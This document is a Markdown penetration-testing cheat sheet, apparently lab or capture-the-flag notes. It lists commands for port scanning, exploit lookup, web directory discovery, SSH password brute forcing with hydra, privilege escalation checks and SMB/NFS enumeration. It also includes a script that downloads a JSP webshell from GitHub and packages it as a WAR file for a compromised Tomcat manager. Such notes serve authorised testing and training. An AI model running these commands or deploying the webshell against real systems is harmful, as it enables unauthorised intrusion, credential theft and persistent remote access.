# Starting Penetration

```msfconsole```

To Open metasploit console

## Port Scan

```nmap IP -sV -sC -p- --min-rate 20000```

alternate

```nmap IP -T4 -A -v```

-p- to scan all ports

20k rate probably way too high. Reduce to reduce risk of alerting firewall.

-sS for TCP SYN Scan

-sV to show services related to each port


### Get Version of Service

NetCat

```nc IP PORT```


### Find Exploits with SearchSploit

```searchsploit servicename version```

### Add new modules to metasploit from exploit-db

Get path from searchsploit

```curl http://www.exploit-db.com/download/ID  /root/.msf4/modules/exploits/custom/CUSTOMFILENAME```



### Metadata

```exiftool file```

### Web Server:


#### Directory Discovery

Word lists are at `/usr/share/wordlists` (In KALI)

```gobuster dir -u URL:port -t threads -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt```

#### Replicate website on local storage

```wget http://ip/ -r```

#### Wordpress vulnerability checker

```wpscan --url URL```

--plugin-detection aggressive    -   Takes a long time, but digs up good dirt


## SSH

### SSH with RSA file

```ssh -i /path/to/file user@IP```


#### Brute Forcing Passwords

```hydra -l USER -P /path/to/wordlist ssh://IP```

https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials


## Apache

### After /manager breach

#### Make Offensive WAR file

```#!/bin/sh
wget https://raw.githubusercontent.com/tennc/webshell/master/jsp/jspbrowser/Browser.jsp -O index.jsp
rm -rf wshell
rm -f wshell.war
mkdir wshell
cp index.jsp wshell/
cd wshell
jar -cvf ../wshell.war *```



## Attempt to Elevate permissions after entry

##### Run Inside of Meterpreter

```run post/multi/recon/local_exploit_suggester```

Gives readout of possible vulnerabilities of connected host

### NFS (RPCBIND?)

Enumerate NFS shares.

```nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.223.98```



### Linux Specific

whoami

#### LinPEAS

https://github.com/carlospolop/PEASS-ng/releases

Only need linpeas.sh

```scp /home/mike/linpeas.sh USER@IP:/home/USER```
```./linpeas.sh```

#### Search for SUID Bit files

SUID Bit - User executes the file with permissions of the file owner

```find / -perm -u=s -type f 2>/dev/null```



### Samba share

##### Quick Enumeration

```nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse IP```

Change port to match nmap results. (Usually 139 or 445)

##### Deep Enumeration

```enum4linux -a IP | tee enum4linux.log```


#### Inspect Samba Share

```smbclient //ip/sambashare```


#### Recursively download the SMB share

```smbget -R smb://ip/sambashare```

